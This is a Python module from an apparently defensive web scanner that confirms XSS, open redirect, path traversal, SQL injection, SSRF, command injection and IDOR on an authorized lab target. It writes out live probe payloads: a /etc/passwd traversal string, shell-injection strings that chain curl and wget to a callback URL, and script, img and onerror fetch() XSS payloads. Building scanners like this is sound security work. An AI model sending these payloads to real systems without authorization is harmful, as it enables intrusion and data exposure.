"""Non-destructive active verifiers.

Each turns a *suspicion* into a confirmed/refuted result against an authorized
lab target. Payloads are deliberately benign:
  - reflected XSS: a unique marker with a few HTML metacharacters; we only check
    whether it comes back UNescaped (proof of reflection context) — no live exploit.
  - open redirect: a canary URL; we only check whether the server would redirect
    off-host. We never follow it.
  - path traversal: a read-only canary; we look for a passwd-style signature.
  - SQLi: a single quote; we look for a database error signature.
All run through LabContext.send (caps, rate-limit, dry-run, kill-switch, audit).
"""

from __future__ import annotations

import difflib
import re

from ..models import Finding, Severity
from .canary import OOBCanary
from .harness import _KEEP_AUTH, LabContext, Point, build_url

# A unique, benign marker. Contains metacharacters so we can tell escaped from raw.
_XSS_MARKER = "sScAn7Zq'\"<x>"
_XSS_RAW = re.compile(re.escape("<x>"))           # raw, unescaped reflection
_REDIRECT_CANARY = "https://celsius-canary.example/redir"
_TRAVERSAL = "../../../../../../etc/passwd"
_PASSWD_SIG = re.compile(r"root:.*?:0:0:")
_SQL_ERRORS = re.compile(
    r"SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|SQLite/JDBC|"
    r"Unclosed quotation mark|quoted string not properly terminated|"
    r"you have an error in your sql", re.I)


def _confirm(title, sev, point, param, payload, detail, evidence) -> Finding:
    return Finding(
        title=title, severity=sev, category="active-verify",
        description=detail,
        recommendation="Confirmed via a benign active probe on an authorized lab "
                       "target. Remediate the input handling.",
        evidence=f"{point.method} {point.url} param={param} payload={payload!r} :: {evidence}"[:300],
        confidence="high",
        exploitability={"verdict": "confirmed-exploitable", "priority": 90,
                        "signals": {"reachable": True, "actively_verified": True}},
    )


def _send_with(point: Point, param: str, value: str, lab: LabContext, purpose: str):
    params = dict(point.params)
    params[param] = value
    if point.method == "POST":
        return lab.send(point.url, method="POST", data=params, purpose=purpose)
    return lab.send(build_url(point.url, params), method="GET", purpose=purpose,
                    follow=False)


def reflected_xss(points: list[Point], lab: LabContext) -> list[Finding]:
    out = []
    for pt in points:
        for param in pt.param_names():
            r = _send_with(pt, param, _XSS_MARKER, lab, "xss-reflect")
            if r is None or not r.body:
                continue
            if _XSS_RAW.search(r.body):
                out.append(_confirm(
                    "Reflected XSS confirmed (unescaped marker)", Severity.HIGH,
                    pt, param, _XSS_MARKER,
                    "A unique marker containing <x> was reflected UNescaped in the "
                    "response, proving an HTML-injection context (reflected XSS).",
                    "marker reflected raw"))
    return out


def open_redirect(points: list[Point], lab: LabContext) -> list[Finding]:
    out = []
    hint = re.compile(r"^(url|redirect|next|return|returnurl|dest|destination|continue|to|r|u)$", re.I)
    for pt in points:
        for param in pt.param_names():
            if not hint.match(param):
                continue
            r = _send_with(pt, param, _REDIRECT_CANARY, lab, "open-redirect")
            if r is None:
                continue
            loc = (r.location or "")
            if r.status in (301, 302, 303, 307, 308) and "celsius-canary.example" in loc:
                out.append(_confirm(
                    "Open redirect confirmed", Severity.MEDIUM, pt, param,
                    _REDIRECT_CANARY,
                    f"The server issued a {r.status} redirect to an attacker-supplied "
                    "external URL (canary). Usable for phishing/token theft.",
                    f"Location: {loc[:120]}"))
    return out


def path_traversal(points: list[Point], lab: LabContext) -> list[Finding]:
    out = []
    hint = re.compile(r"(file|path|page|name|doc|template|include|load|read)", re.I)
    for pt in points:
        for param in pt.param_names():
            if not hint.search(param):
                continue
            r = _send_with(pt, param, _TRAVERSAL, lab, "path-traversal")
            if r is None or not r.body:
                continue
            if _PASSWD_SIG.search(r.body):
                out.append(_confirm(
                    "Path traversal confirmed (file read)", Severity.HIGH, pt, param,
                    _TRAVERSAL,
                    "A traversal payload returned a passwd-style signature, proving "
                    "arbitrary file read.", "root:...:0:0: in response"))
    return out


def sqli_error(points: list[Point], lab: LabContext) -> list[Finding]:
    out = []
    for pt in points:
        for param in pt.param_names():
            base = pt.params.get(param) or "1"
            r = _send_with(pt, param, base + "'", lab, "sqli-error")
            if r is None or not r.body:
                continue
            if _SQL_ERRORS.search(r.body):
                out.append(_confirm(
                    "SQL injection indicated (database error)", Severity.HIGH, pt, param,
                    base + "'",
                    "Appending a single quote triggered a database error, indicating "
                    "the parameter is concatenated into a SQL query.",
                    "SQL error signature in response"))
    return out


# Parameter names that plausibly carry a URL/host the server fetches — the SSRF
# surface. A substring match keeps it broad; the probe only *confirms* on a real
# out-of-band callback, so a loose hint costs a wasted request, not a false report.
_SSRF_HINT = re.compile(
    r"url|uri|link|src|source|dest|target|redirect|redir|feed|rss|webhook|"
    r"callback|fetch|proxy|forward|host|domain|site|image|img|remote|load|"
    r"open|reference|ref|continue|return|preview|resource|endpoint|avatar|upload",
    re.I)


def _oob_probe(points: list[Point], lab: LabContext, canary: OOBCanary, *,
               purpose: str, payloads_for, title: str, detail: str,
               severity: Severity, label: str, param_hint=None,
               wait_timeout: float = 3.0) -> list[Finding]:
    """Shared out-of-band probe loop (SSRF / RCE / blind-XSS differ only in payload).

    For each candidate param: mint one canary token, send every payload variant
    embedding its callback URL, then wait once. A recorded hit is *deterministic*
    proof the injected value reached a sink that made an outbound request — the same
    independent-corroboration bar the response-based verifiers hold. Every send goes
    through LabContext.send (scope/caps/rate-limit/attestation/kill-switch/audit) and
    each payload only ever causes a benign GET to the operator's own canary."""
    out: list[Finding] = []
    for pt in points:
        for param in pt.param_names():
            if param_hint is not None and not param_hint.search(param):
                continue
            ok, _why = lab.can_send()
            if not ok:
                return out
            token = canary.new_token()
            url = canary.url_for(token)
            for payload in payloads_for(url, pt.params.get(param)):
                ok, _why = lab.can_send()
                if not ok:
                    break
                _send_with(pt, param, payload, lab, purpose)
            if not canary.wait_for_hit(token, timeout=wait_timeout):
                continue
            src = (canary.hits(token)[0].src_ip if canary.hits(token) else "?")
            out.append(_confirm(title, severity, pt, param, label, detail,
                                f"out-of-band callback received from {src}"))
    return out


def ssrf_oob(points: list[Point], lab: LabContext, canary: OOBCanary,
             *, wait_timeout: float = 3.0) -> list[Finding]:
    """Blind-SSRF probe: inject a unique OOB callback URL into URL-ish params and
    confirm ONLY if the target actually fetches it (a recorded canary hit)."""
    return _oob_probe(
        points, lab, canary, purpose="ssrf-oob", param_hint=_SSRF_HINT,
        payloads_for=lambda url, _base: [url],
        title="Blind SSRF confirmed (out-of-band callback)", severity=Severity.HIGH,
        label="oob-canary-url",
        detail="The server made an outbound request to a unique attacker-controlled "
               "URL injected into this parameter — proving server-side request forgery. "
               "Reachable internal services / cloud metadata may be exposed.",
        wait_timeout=wait_timeout)


def _rce_payloads(url: str, base) -> list[str]:
    b = str(base) if base else "1"
    fetch = f"curl -s {url}"           # only ever GETs the operator's canary — benign
    wget = f"wget -qO- {url}"          # fallback for hosts without curl
    return [f"{b};{fetch}", f"{b}|{fetch}", f"{b}&&{fetch}",
            f"$({fetch})", f"`{fetch}`", f"{b};{wget}"]


def command_injection_oob(points: list[Point], lab: LabContext, canary: OOBCanary,
                          *, wait_timeout: float = 3.0) -> list[Finding]:
    """OS command-injection probe: inject shell payloads that make the host fetch a
    unique canary URL. A callback is deterministic proof the value reached a shell —
    i.e. remote command execution. Payloads are benign (they only run `curl`/`wget`
    against the operator's canary; nothing is read, written, or destroyed)."""
    return _oob_probe(
        points, lab, canary, purpose="rce-oob", param_hint=None,
        payloads_for=_rce_payloads,
        title="OS command injection confirmed (out-of-band callback)",
        severity=Severity.CRITICAL, label="oob-shell-callback",
        detail="A shell command-substitution payload injected into this parameter "
               "caused the host to make an outbound request to a unique canary URL — "
               "proving remote command execution.",
        wait_timeout=wait_timeout)


def _xss_payloads(url: str, _base) -> list[str]:
    return [f'<script src="{url}"></script>',
            f'"><script src="{url}"></script>',
            f'<img src="{url}">',
            f'"><img src=x onerror="fetch(\'{url}\')">',
            f"<svg onload=\"fetch('{url}')\">"]


def blind_xss_oob(points: list[Point], lab: LabContext, canary: OOBCanary,
                  *, wait_timeout: float = 3.0) -> list[Finding]:
    """Blind/stored-XSS beacon: inject markup that loads a unique canary resource.
    A callback proves the value was rendered into an HTML/JS context that fetched
    it — stored XSS, or server-side rendering/preview of the injected markup.

    Honest scope: execution in a *victim's* browser is asynchronous and won't fire
    during the scan window; this confirms the synchronous cases (server-side render,
    immediate reflection) and plants a beacon the canary keeps recording."""
    return _oob_probe(
        points, lab, canary, purpose="blind-xss-oob", param_hint=None,
        payloads_for=_xss_payloads,
        title="HTML/script injection confirmed (out-of-band beacon fired)",
        severity=Severity.HIGH, label="oob-xss-beacon",
        detail="Injected markup loaded a unique canary resource, proving the value "
               "was rendered into an HTML/JS context that fetched it (stored/blind XSS "
               "or server-side render of attacker markup).",
        wait_timeout=wait_timeout)


# Maps a config/CLI OOB probe name to its verifier — the plugin runs the enabled
# subset under one shared canary.
OOB_PROBES = {
    "ssrf": ssrf_oob,
    "rce": command_injection_oob,
    "blind-xss": blind_xss_oob,
}


def run_ssrf_oob(points: list[Point], lab: LabContext, *,
                 host: str | None = None, bind: str = "127.0.0.1",
                 port: int = 0) -> list[Finding]:
    """Convenience wrapper that owns the canary lifecycle (used in tests/tools)."""
    with OOBCanary(host=host or bind, bind=bind, port=port) as canary:
        return ssrf_oob(points, lab, canary)


# ---- IDOR / BOLA (broken object-level authorization) --------------------------
# No canary — this is an *authorization* test: replay the same object-referencing
# request under different identities and see who is wrongly allowed to read it.

# Param names that reference an object (so swapping/replaying tests ownership).
_IDOR_HINT = re.compile(
    r"(?:^|_)(id|uid|uuid|guid|pid|oid|no|num|key|ref)$|"
    r"user|account|acct|order|invoice|doc|document|file|record|profile|customer|"
    r"member|group|team|project|ticket|message|msg|item|cart",
    re.I)
# Values that *look* like an object reference (numeric id or a UUID).
_IDVAL = re.compile(r"^\d+$|^[0-9a-f]{8}-[0-9a-f]{4}-", re.I)


def _has_object_ref(pt: Point) -> bool:
    return any(_IDOR_HINT.search(n) or _IDVAL.search(str(v or ""))
               for n, v in pt.params.items())


def _ref_label(pt: Point) -> str:
    for n in pt.param_names():
        if _IDOR_HINT.search(n):
            return n
    for n, v in pt.params.items():
        if _IDVAL.search(str(v or "")):
            return n
    names = pt.param_names()
    return names[0] if names else "?"


def _similar(a, b) -> float:
    a, b = (a or "")[:4000], (b or "")[:4000]
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a, b).ratio()


def _replay(pt: Point, lab: LabContext, auth_override=_KEEP_AUTH):
    """Replay the point's exact request (params unchanged) under a given identity."""
    if pt.method == "POST":
        return lab.send(pt.url, method="POST", data=pt.params, purpose="idor",
                        payload=True, auth_override=auth_override)
    return lab.send(build_url(pt.url, pt.params), purpose="idor", follow=False,
                    payload=True, auth_override=auth_override)


def idor_bola(points: list[Point], lab: LabContext, second_session=None,
              *, min_body: int = 40, similarity: float = 0.95) -> list[Finding]:
    """Broken object-level authorization: replay each object-referencing request as
    the primary user (A), unauthenticated, and — if given — a second user (B).

    Requires a primary authenticated session (`lab.auth`); the whole test is
    relative to "what A is allowed to see". Confirms deterministically:
      - **missing auth** — the unauthenticated replay returns A's object unchanged
        (endpoint enforces no authentication), or
      - **BOLA/IDOR** — a *second* authenticated user receives A's object unchanged
        while the unauthenticated request is denied (the object reference isn't
        scoped to its owner).

    Only object-referencing requests are tested (an id-like param name or value),
    which keeps shared/public pages out. Read-only: it replays existing requests,
    injecting nothing."""
    if not getattr(lab, "auth", None):
        return []
    out: list[Finding] = []
    for pt in points:
        if not _has_object_ref(pt):
            continue
        ok, _why = lab.can_send()
        if not ok:
            return out
        rA = _replay(pt, lab)                              # primary identity A
        if rA is None or rA.status != 200 or len(rA.body or "") < min_body:
            continue
        body_a = rA.body
        rU = _replay(pt, lab, auth_override=None)          # no credentials
        ref = _ref_label(pt)
        if rU is not None and rU.status == 200 and _similar(rU.body, body_a) >= similarity:
            out.append(_confirm(
                "Broken access control — object served without authentication",
                Severity.HIGH, pt, ref, "(unauthenticated replay)",
                "Replaying this authenticated request with NO credentials returned the "
                "same protected object, so the endpoint enforces no authentication.",
                f"unauth status {rU.status}; body matches the authenticated response"))
            continue
        if second_session:                                 # cross-user (B sees A's object)
            ok, _why = lab.can_send()
            if not ok:
                return out
            rB = _replay(pt, lab, auth_override=second_session)
            if rB is not None and rB.status == 200 and _similar(rB.body, body_a) >= similarity:
                out.append(_confirm(
                    "Broken object-level authorization (IDOR / BOLA)",
                    Severity.HIGH, pt, ref, "(second-identity replay)",
                    "A second authenticated user received user A's access-controlled "
                    "object unchanged, while the unauthenticated request was denied — the "
                    "object reference is not scoped to its owner.",
                    f"user-B status {rB.status}; body matches user-A; unauth denied "
                    f"(status {getattr(rU, 'status', 'n/a')})"))
    return out


ALL_VERIFIERS = [
    ("reflected-xss", reflected_xss),
    ("open-redirect", open_redirect),
    ("path-traversal", path_traversal),
    ("sqli-error", sqli_error),
]


def run_all(points: list[Point], lab: LabContext) -> tuple[list[Finding], list[str]]:
    findings: list[Finding] = []
    ran: list[str] = []
    for name, fn in ALL_VERIFIERS:
        ok, _ = lab.can_send()
        if not ok:
            break
        findings.extend(fn(points, lab))
        ran.append(name)
    return findings, ran
